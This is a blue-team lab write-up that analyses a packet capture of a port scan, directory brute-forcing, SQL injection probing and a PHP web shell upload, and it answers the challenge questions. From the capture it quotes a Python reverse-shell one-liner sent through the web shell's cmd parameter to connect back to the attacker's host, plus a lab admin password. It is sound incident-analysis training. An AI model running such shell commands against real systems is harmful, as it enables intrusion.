# Network Analysis – Web Shell 

## Blue Team Lab Online ( challenge )

### Tool used: Wireshark

### Scenario

The SOC received an alert in their SIEM for ‘Local to Local Port Scanning’ where an internal private IP began scanning another internal system. 

## Alert: Local to Local Port Scanning, internal private IP began scanning another internal system.

Given FIle Name: BTLOPortScan.pcap

Password: btlo 

## Overall Analysis

### File Details

```jsx
File Size: 4,558 kB

**Time**
    First packet:2021-02-07 11:31:22
    Last packet:2021-02-07 11:46:31
    Elapsed:00:15:08 
```

In Conversation by filtering the packets bytes , reviewing them first

ipv4

![WhatsApp Image 2026-01-05 at 12 38 04 PM](https://github.com/user-attachments/assets/4bed047a-496b-4c03-9168-ebb2a0e7932b)


In TCP option the 10.251.96.4 scanning 10.251.96.5 because the there are many ports 

![WhatsApp Image 2026-01-05 at 12 38 14 PM](https://github.com/user-attachments/assets/23bdda73-2e05-4bd7-9264-68dd67747f8a)


The 172.20.10.2 is a ubuntu sever ip address

```jsx
14	2021/038 16:31:24.638183882Z	172.20.10.5	172.20.10.2	HTTP	486	GET / HTTP/1.1
Apache/2.4.29 (Ubuntu) Server at 172.20.10.2 Port 80
```

There was a POST requested by ip 172.20.10.2 where the Admin Username and password where found.

```jsx
40	2021/038 16:31:35.524288162Z	172.20.10.2	172.20.10.5	HTTP	631	HTTP/1.1 200 OK  (text/html)

POST /login.php HTTP/1.1
Host: 172.20.10.2
Connection: keep-alive
Content-Length: 36
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://172.20.10.2
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://172.20.10.2/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=jbpg5n6jkaidu9955fct9p0v6l

username=admin&password=Admin%401234
```

Other POST request was made by ip 10.251.96.5

```jsx
2192	2021/038 16:33:40.724701584Z	10.251.96.5	10.251.96.4	HTTP	643	HTTP/1.1 200 OK  (text/html)

POST /login.php HTTP/1.1
Host: 10.251.96.5
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.251.96.5/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Connection: keep-alive
Cookie: PHPSESSID=10b3rrv35ctuvv7vlnsfr6ugjt
Upgrade-Insecure-Requests: 1

username=%27&password=%27
```

We Found out that ip 10.251.96.4 is using gobuster 3.0.1 tool.  

```jsx
2215	2021/038 16:34:05.329766053Z	10.251.96.4	10.251.96.5	HTTP	156	GET / HTTP/1.1 

GET / HTTP/1.1
Host: 10.251.96.5
User-Agent: gobuster/3.0.1
Accept-Encoding: gzip

HTTP/1.1 200 OK
Date: Sun, 07 Feb 2021 16:34:05 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: PHPSESSID=cuu5jgue9npenuifvak3ah68kd; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 136
Content-Type: text/html; charset=UTF-8
```

The Filter used : (ip.dst == 10.251.96.4)  && (http.response.code == 200) for viewing only the status code 200 , sorted the length field high → low 

```jsx
Suspicious lenght packets

There was an image
13894	2021/038 16:35:25.148225171Z	10.251.96.5	10.251.96.4	HTTP	8977	HTTP/1.1 200 OK  (text/html)

Gobuster requests
7725	2021/038 16:34:05.733827052Z	10.251.96.5	10.251.96.4	HTTP	8494	HTTP/1.1 200 OK  (text/html)

```

 

Filtered (http.request.method == "POST") && (ip.src == 10.251.96.4) sorted the packet and found out that attacker is using sqlmap/1.4.7

```jsx
13979	2021/038 16:36:17.774693113Z	10.251.96.4	10.251.96.5	HTTP	95	POST / HTTP/1.1  (application/x-www-form-urlencoded)
```

Once the attacker got accessed to php web shell after uploading the shell code on packet 16102

the attackers first command 

```jsx
Filename dbfunctions.php as php web shell code 
16108	2021/038 16:40:43.892725154Z	10.251.96.5	10.251.96.4	HTTP	816	HTTP/1.1 200 OK  (text/html)

Attacker command execution
16134	2021/038 16:40:51.125681644Z	10.251.96.4	10.251.96.5	HTTP	455	GET /uploads/dbfunctions.php?cmd=id HTTP/1.1 
```

The attempts to RCE (Remote code execution)

```jsx
16201	2021/038 16:42:35.675646891Z	10.251.96.4	10.251.96.5	HTTP	706	GET /uploads/dbfunctions.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.251.96.4%22,4422));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27 HTTP/1.1 

GET /uploads/dbfunctions.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.251.96.4%22,4422));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27 HTTP/1.1
Host: 10.251.96.5
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: PHPSESSID=10b3rrv35ctuvv7vlnsfr6ugjt
Upgrade-Insecure-Requests: 1
```

## Challenge questions

**1.What is the IP responsible for conducting the port scan activity?**

Saw this ip address was scanning the 10.251.96.5 ip in different types of port in Conversation

Answer: 10.251.96.4


**2.What is the port range scanned by the suspicious host?**

In TCP option in conversation sort the ports form small - Big to see the range properly 

Answer: 1 - 1024 


**3.What is the type of port scan conducted?**

Answer: TCP-SYN 


**4.Two more tools were used to perform reconnaissance against open ports, what were they?**

The packet details:

```jsx
2215	2021/038 16:34:05.329766053Z	10.251.96.4	10.251.96.5	HTTP	156	GET / HTTP/1.1 
13979	2021/038 16:36:17.774693113Z	10.251.96.4	10.251.96.5	HTTP	95	POST / HTTP/1.1  (application/x-www-form-urlencoded)
```

Answer: gobuster 3.0.1,sqlmap/1.4.7


5.What is the name of the php file through which the attacker uploaded a web shell?

During the investigation we found the attacker uploaded dbfunction.php file thourgh  /upload/editprofile.php

Answer: editprofile.php


6.What is the name of the web shell that the attacker uploaded? 

```jsx
Filename dbfunctions.php as php web shell code 
16108	2021/038 16:40:43.892725154Z	10.251.96.5	10.251.96.4	HTTP	816	HTTP/1.1 200 OK  (text/html)

```

Answer: dbfunctions.php


7.What is the parameter used in the web shell for executing commands?

The attacker was using php web shell 

```jsx
16134	2021/038 16:40:51.125681644Z	10.251.96.4	10.251.96.5	HTTP	455	GET /uploads/dbfunctions.php?cmd=id HTTP/1.1 
```

Answer: cmd 


8.What is the first command executed by the attacker?

```jsx
16134	2021/038 16:40:51.125681644Z	10.251.96.4	10.251.96.5	HTTP	455	GET /uploads/dbfunctions.php?cmd=id HTTP/1.1 
```

Answer: id 


9.What is the type of shell connection the attacker obtains through command execution?

The attacker was using python to RCE, Connecting to the target system is known as reverse shell

```jsx
GET /uploads/dbfunctions.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.251.96.4%22,4422));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27 HTTP/1.1
```

Answer: Reverse shell


10.What is the port he uses for the shell connection? 

```jsx
s.connect((%2210.251.96.4%22,4422))
```

Answer:4422

### Done By Ruthran-sec
